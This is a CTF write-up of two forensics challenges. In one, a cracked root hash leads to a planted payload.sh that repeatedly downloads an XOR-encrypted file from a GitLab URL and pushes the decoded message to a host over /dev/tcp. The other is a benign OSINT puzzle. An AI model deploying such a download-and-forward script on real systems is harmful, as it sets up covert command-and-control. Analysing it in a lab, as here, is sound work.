# forensics

## DFIR

> Solved by : thewhiteh4t

* we get a `.ova` file for this one
* challenge states that activity was detected in / directory
* in / directory we can see a `.pot` file

![](https://i.imgur.com/HdIn51S.png)

* this file contains :

```
$6$fZ/iAgR.$FHl9m/ibTVBQ3OQ645IiLtrcxSsxdt8pTQHh7knfQ2GhD7Pbu0Dv0evXaGnnMVjV7xe5KlRprL5hWEjE6/Ruj0:toor
```

* looks like shadow file format so i tried to login as `root` with `toor` as password and it works!
* in `/root` we can see some interesting dot files

![](https://i.imgur.com/wFSclR3.png)

* `payload.sh` pulls an encrypted csv file from gitlab and decrypts it

```
    #!/bin/bash
    W=$((15*60))
    K=120
    while true
    do
        echo "sleeping for $W seconds"
        sleep $W
        rm .encrypted_csv.data
        wget https://gitlab.com/thehacker1/payload/-/raw/master/.encrypted_csv.data
        echo "downloaded file"
        F="./.encrypted_csv.data"
        hexdump -v -e '/1 "%u\n"' $F | while read B; do
            E=$((K^B))
            C=$(printf \\$(printf '%03o' $E))
            echo -n $C >> encrypted.csv
        done
        echo "decrypted newest command"
        S=$(cat encrypted.csv)
        rm encrypted.csv
        S="${S::-1}"
        D=,
        S=$S$D
        array=();
        while [[ $S ]]; do
            array+=( "${S%%"$D"*}" );
            S=${S#*"$D"};
        done;
        declare -a array
        M=${array[0]}
        I=${array[1]}
        P=${array[2]}
        M=${M##WPI}
        echo "routing message to $I:$P"
        echo "$M" > /dev/tcp/$I/$P
    done
```

* I modified the script to not remove the new file by commenting out line 19
* `encrypted.csv` holds our flag!

![](https://i.imgur.com/6KQGa3L.png)

----------

## Holmes:

> Solved by : Starry-Lord

* the challenge gives us the following string 

```
Z29vZCB0aG91Z2h0LCBidXQgbm8u
```

* it looks base64 , however  base64 decoder shows the following:

```
good thought, but no.
```

* using `Sherlock` OSINT tool we found this github repository :

```
https://github.com/Z29vZCB0aG91Z2h0LCBidXQgbm8u/flag/blob/main/README.md
```

```
WPI{sh3rlock_holmes_w0uld_be_pr0ud}
```